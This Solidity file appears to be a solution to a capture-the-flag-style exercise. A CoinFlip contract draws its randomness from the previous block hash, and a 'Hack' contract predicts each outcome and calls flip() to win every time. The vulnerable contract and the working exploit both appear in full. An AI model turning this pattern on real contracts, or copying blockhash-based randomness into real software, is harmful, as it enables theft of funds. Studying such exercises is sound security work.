// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract Hack {
    using SafeMath for uint256;

    CoinFlip private coinFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor(address cf) {
        coinFlip = CoinFlip(cf);
    }

    function run() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 c = blockValue.div(FACTOR);
        bool guess = c == 1 ? true : false;
        coinFlip.flip(guess);
    }
}